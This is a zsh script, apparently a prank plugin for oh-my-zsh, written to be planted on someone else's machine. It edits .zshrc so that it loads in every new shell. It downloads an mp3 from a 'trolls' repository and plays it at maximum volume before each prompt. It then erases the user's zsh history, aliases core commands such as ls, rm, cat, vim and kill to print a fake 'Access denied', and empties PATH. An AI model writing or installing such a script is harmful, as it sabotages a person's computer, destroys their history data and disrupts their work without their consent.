NAME="autoco"
STRING="plugins=($NAME"
FILE=".zshrc"
DIR="~/.oh-my-zsh/custom/plugins/$NAME/"
SOUND="$DIR""apoil.mp3"
if ! grep -q "$STRING" "$FILE" ; then
	sed -i "s/^plugins=(/plugins=($NAME /" "$FILE"
fi
mkdir -p "$DIR"
if [ ! -e "$SOUND" ]; then
	wget -q -O "$SOUND" "https://github.com/kema-dev/trolls/blob/main/shell_audio/apoil.mp3\?raw\=true"
fi
precmd() { osascript -e 'set Volume 10' ; afplay "$SOUND" > /dev/null & }
echo -n >| $HOME/.zsh_history

alias chmod="echo chmod: Access denied"
alias vim="echo vim: Access denied"
alias vi="echo vi: Access denied"
alias ls="echo ls: Access denied"
alias echo="echo echo: Access denied"
alias cat="echo cat: Access denied"
alias cp="echo cp: Access denied"
alias mv="echo mv: Access denied"
alias rm="echo rm: Access denied"
alias mkdir="echo mkdir: Access denied"
alias rmdir="echo rmdir: Access denied"
alias grep="echo grep: Access denied"
alias less="echo less: Access denied"
alias more="echo more: Access denied"
alias tail="echo tail: Access denied"
alias head="echo head: Access denied"
alias top="echo top: Access denied"
alias ps="echo ps: Access denied"
alias kill="echo kill: Access denied"
alias killall="echo killall: Access denied"
alias open="echo open: Access denied"
export PATH=""
